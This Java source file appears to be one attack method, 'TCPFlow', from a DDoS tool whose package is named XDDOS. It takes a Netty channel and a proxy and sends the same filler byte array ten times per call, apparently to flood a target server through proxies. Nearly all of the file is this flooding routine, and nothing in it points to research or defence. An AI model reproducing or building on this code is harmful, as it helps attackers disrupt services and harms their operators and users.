package XD.XDDOS.methods.impl;

import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.proxy.ProxyLoader.Proxy;
import io.netty.channel.Channel;

public class TCPFlow implements IMethod{
    private Byte max = Byte.MAX_VALUE;
    private Byte[] arr = new Byte[]{max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max,max};
    @Override
    public void accept(Channel channel, Proxy p) {
        channel.write(arr);
        channel.write(arr);
        channel.write(arr);
        channel.write(arr);
        channel.write(arr);
        channel.write(arr);
        channel.write(arr);
        channel.write(arr);
        channel.write(arr);
        channel.write(arr);
    }
    
}
